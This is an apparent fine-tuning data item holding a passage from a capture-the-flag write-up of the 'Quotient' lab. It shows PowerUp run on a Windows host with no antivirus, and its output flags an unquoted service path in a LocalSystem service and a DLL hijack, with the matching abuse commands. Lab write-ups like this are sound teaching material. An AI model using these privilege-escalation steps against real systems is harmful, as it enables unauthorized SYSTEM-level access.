# UNCATEGORIZED — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: uncategorized

## Scenario

In the challenge 'Quotient', explain this phase: PowerUp.

## Analysis / Response

### PowerUp

Luckily, there isn't any active AntiVirus here, so we can run this without any modification:

```pwsh
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

We get the following output:

```
ServiceName    : Development Service
Path           : C:\Program Files\Development Files\Devservice Files\Service.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; 
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'Development Service' -Path <HijackPath>
CanRestart     : False
Name           : Development Service
Check          : Unquoted Service Paths

ServiceName    : Development Service
Path           : C:\Program Files\Development Files\Devservice Files\Service.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'Development Service' -Path <HijackPath>
CanRestart     : False
Name           : Development Service
Check          : Unquoted Service Paths

ServiceName    : Development Service
Path           : C:\Program Files\Development Files\Devservice Files\Service.exe
ModifiablePath : @{ModifiablePath=C:\Program Files\Development Files; IdentityReference=BUILTIN\Users; 
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'Development Service' -Path <HijackPath>
CanRestart     : False
Name           : Development Service
Check          : Unquoted Service Paths

ModifiablePath    : C:\Users\Sage\AppData\Local\Microsoft\WindowsApps
IdentityReference : THM-QUOTIENT\Sage
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\Sage\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\Sage\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Sage\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

```

We can see that there is an unquoted service path vulnerability with the "Development Service" service

# Privilege Escalation
